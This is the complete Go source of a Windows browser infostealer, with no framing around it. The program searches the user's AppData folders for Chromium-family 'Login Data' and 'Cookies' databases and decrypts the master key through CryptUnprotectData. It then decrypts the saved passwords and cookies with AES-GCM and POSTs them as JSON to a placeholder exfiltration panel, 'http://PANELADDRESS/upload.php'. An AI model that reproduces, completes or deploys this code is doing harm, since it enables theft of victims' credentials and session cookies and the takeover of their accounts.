package main

import (
	"bytes"
	"crypto/aes"
	"crypto/cipher"
	"database/sql"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"io/ioutil"
	"math/rand"

	"net/http"
	"os"
	"path/filepath"
	"strings"
	"sync"
	"syscall"
	"unsafe"

	_ "github.com/mattn/go-sqlite3"
	"github.com/tidwall/gjson"
)

var (
	url             = "http://PANELADDRESS/upload.php"
	letterBytes     = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"
	roamingpath     = os.Getenv("APPDATA")
	localpath       = os.Getenv("LOCALAPPDATA")
	programdata     = os.Getenv("PROGRAMDATA")
	localvar        = "Local State"
	LoginDataList   []string
	CookieDataList  []string
	wg              sync.WaitGroup
	dllcrypt32      = syscall.NewLazyDLL("Crypt32.dll")
	dllkernel32     = syscall.NewLazyDLL("Kernel32.dll")
	procDecryptData = dllcrypt32.NewProc("CryptUnprotectData")
	procLocalFree   = dllkernel32.NewProc("LocalFree")
)

type UrlNamePass struct {
	Url      string
	Username string
	Pass     string
}

type Cookies struct {
	Cookieline string
}

type CookiesBrowser struct {
	CookieLines []Cookies
}

type JsonMain struct {
	Passwords []UrlNamePass
	Cookies   []CookiesBrowser
}

type DATA_BLOB struct {
	cbData uint32
	pbData *byte
}

func NewBlob(d []byte) *DATA_BLOB {
	if len(d) == 0 {
		return &DATA_BLOB{}
	}
	return &DATA_BLOB{
		pbData: &d[0],
		cbData: uint32(len(d)),
	}
}

func (b *DATA_BLOB) ToByteArray() []byte {
	d := make([]byte, b.cbData)
	copy(d, (*[1 << 30]byte)(unsafe.Pointer(b.pbData))[:])
	return d
}

func Win32CryptUnprotectData(cipherText string, entropy bool) ([]byte, error) {
	var outblob DATA_BLOB
	var inblob = NewBlob([]byte(cipherText))
	checkExist, _, errProcDecryptData := procDecryptData.Call(uintptr(unsafe.Pointer(inblob)), 0, 0, 0, 0, 0, uintptr(unsafe.Pointer(&outblob)))
	if checkExist == 0 {
		return nil, errProcDecryptData
	}
	defer procLocalFree.Call(uintptr(unsafe.Pointer(outblob.pbData)))
	return outblob.ToByteArray(), nil
}

func DecryptAESPwd(pwd, masterKey []byte) ([]byte, error) {
	nonce := pwd[3:15]
	cryptoBlock := pwd[15:]
	block, err := aes.NewCipher(masterKey)
	if err != nil {
		return nil, err
	}
	blockMode, _ := cipher.NewGCM(block)
	decryptedData, err := blockMode.Open(nil, nonce, cryptoBlock, nil)
	if err != nil {
		return nil, err
	}
	return decryptedData, nil
}

func RandStringBytes(n int) string {
	b := make([]byte, n)
	for i := range b {
		b[i] = letterBytes[rand.Intn(len(letterBytes))]
	}
	return string(b)
}

func checkexist(filePath string) bool {
	if _, err := os.Stat(filePath); os.IsNotExist(err) {
		return false
	}
	return true
}

func writedata(log string, data string) {
	file, _ := os.Create(log)
	defer file.Close()
	file.WriteString(data)
}

func copyfile(pathSourceFile string, pathDestFile string) {
	input, _ := ioutil.ReadFile(pathSourceFile)
	_ = ioutil.WriteFile(pathDestFile, input, 0644)
}

func searchdata(wg *sync.WaitGroup, searchDir string) {
	defer wg.Done()
	_ = filepath.Walk(searchDir, func(path string, f os.FileInfo, err error) error {
		if f.Name() == "Login Data" {
			LoginDataList = append(LoginDataList, path)
		}
		if f.Name() == "Cookies" {
			CookieDataList = append(CookieDataList, path)
		}
		return nil
	})
}

func getmasterkey(file string) ([]byte, error) {
	var keyFilePath string
	if strings.Contains(file, "Opera") {
		keyFilePath = fmt.Sprintf("%s\\%s", filepath.Dir(file), localvar)
	} else {
		keyFilePath = fmt.Sprintf("%s\\%s", filepath.Dir(filepath.Dir(file)), localvar)
	}
	_, err := os.Stat(keyFilePath)
	if !os.IsNotExist(err) {
		if checkexist(keyFilePath) {
			res, _ := ioutil.ReadFile(keyFilePath)
			keyEncrypted, err := base64.StdEncoding.DecodeString(gjson.Get(string(res), "os_crypt.encrypted_key").String())
			if err == nil {
				keyEncrypted = keyEncrypted[5:]
				masterKey, err := Win32CryptUnprotectData(string(keyEncrypted), false)
				if err == nil {
					return masterKey, nil
				}
			}
			return []byte{}, err
		}
	}
	return []byte{}, err
}

func intConv(integer string) string {
	if integer == "1" {
		return "TRUE"
	}
	return "FALSE"
}

func main() {

	wg.Add(2)
	go searchdata(&wg, roamingpath)
	go searchdata(&wg, localpath)
	wg.Wait()

	var Logindata []UrlNamePass
	for _, file := range LoginDataList {
		masterKey, errMasterKey := getmasterkey(file)
		newfile := fmt.Sprintf("%s\\%s", filepath.Dir(file), RandStringBytes(15))
		copyfile(file, newfile)
		db, err := sql.Open("sqlite3", newfile)
		if err == nil {
			defer db.Close()
			rows, err := db.Query("SELECT signon_realm, username_value, password_value FROM logins")
			if err == nil {
				defer rows.Close()
				var signonUrl, username, password string
				for rows.Next() {
					rows.Scan(&signonUrl, &username, &password)
					if errMasterKey == nil {
						decryptedPassword, errAesDecrypt := DecryptAESPwd([]byte(password), masterKey)
						if errAesDecrypt != nil {
							decryptedPassword, errUnprotectData := Win32CryptUnprotectData(password, false)
							if errUnprotectData != nil {
								Logindata = append(Logindata, UrlNamePass{
									Url:      signonUrl,
									Username: username,
									Pass:     string(decryptedPassword),
								})
							}
						}
						Logindata = append(Logindata, UrlNamePass{
							Url:      signonUrl,
							Username: username,
							Pass:     string(decryptedPassword),
						})
					} else {
						decryptedPassword, errUnprotectData := Win32CryptUnprotectData(password, false)
						if errUnprotectData == nil {
							Logindata = append(Logindata, UrlNamePass{
								Url:      signonUrl,
								Username: username,
								Pass:     string(decryptedPassword),
							})
						} else {
							Logindata = append(Logindata, UrlNamePass{
								Url:      signonUrl,
								Username: username,
								Pass:     "err",
							})
						}
					}
				}
			}
		}
	}

	var CookieBro []CookiesBrowser
	for _, file := range CookieDataList {
		masterKey, errMasterKey := getmasterkey(file)
		newfile := fmt.Sprintf("%s\\%s", filepath.Dir(file), RandStringBytes(15))
		copyfile(file, newfile)
		db, err := sql.Open("sqlite3", newfile)
		if err == nil {
			defer db.Close()
			rows, err := db.Query("SELECT host_key, is_httponly, path, is_secure, expires_utc, name, encrypted_value FROM cookies")
			if err == nil {
				defer rows.Close()
				var Cook []Cookies
				var hostKey, isHttponly, path, isSecure, expiresUtc, name, encryptedValue string
				for rows.Next() {
					rows.Scan(&hostKey, &isHttponly, &path, &isSecure, &expiresUtc, &name, &encryptedValue)
					if errMasterKey == nil {
						decryptedPassword, errAesDecrypt := DecryptAESPwd([]byte(encryptedValue), masterKey)
						if errAesDecrypt != nil {
							decryptedPassword, errUnprotectData := Win32CryptUnprotectData(encryptedValue, false)
							if errUnprotectData != nil {
								Cookieline := fmt.Sprintf("%s\t%s\t%s\t%s\t%s\t%s\t%s\n", hostKey, intConv(isHttponly), path, intConv(isSecure), expiresUtc, name, decryptedPassword)
								Cook = append(Cook, Cookies{
									Cookieline: Cookieline,
								})
							}
						}
						Cookieline := fmt.Sprintf("%s\t%s\t%s\t%s\t%s\t%s\t%s\n", hostKey, intConv(isHttponly), path, intConv(isSecure), expiresUtc, name, decryptedPassword)
						Cook = append(Cook, Cookies{
							Cookieline: Cookieline,
						})
					} else {
						decryptedPassword, errUnprotectData := Win32CryptUnprotectData(encryptedValue, false)
						if errUnprotectData == nil {
							Cookieline := fmt.Sprintf("%s\t%s\t%s\t%s\t%s\t%s\t%s\n", hostKey, intConv(isHttponly), path, intConv(isSecure), expiresUtc, name, decryptedPassword)
							Cook = append(Cook, Cookies{
								Cookieline: Cookieline,
							})
						} else {
							Cookieline := fmt.Sprintf("%s\t%s\t%s\t%s\t%s\t%s\terr\n", hostKey, intConv(isHttponly), path, intConv(isSecure), expiresUtc, name)
							Cook = append(Cook, Cookies{
								Cookieline: Cookieline,
							})
						}
					}
				}
				CookieBro = append(CookieBro, CookiesBrowser{
					CookieLines: Cook,
				})
			}
		}
	}

	var JsonMainStruct []JsonMain
	JsonMainStruct = append(JsonMainStruct, JsonMain{
		Passwords: Logindata,
		Cookies:   CookieBro,
	})

	LogJson := &JsonMainStruct
	PCLogJson, err := json.Marshal(LogJson)

	//ioutil.WriteFile("data.json", PCLogJson, 0644)

	if err == nil {
		req, err := http.NewRequest("POST", url, bytes.NewBuffer(PCLogJson))
		req.Header.Set("Content-Type", "application/json")
		client := &http.Client{}
		resp, err := client.Do(req)
		if err != nil {

		}
		defer resp.Body.Close()
	}
}
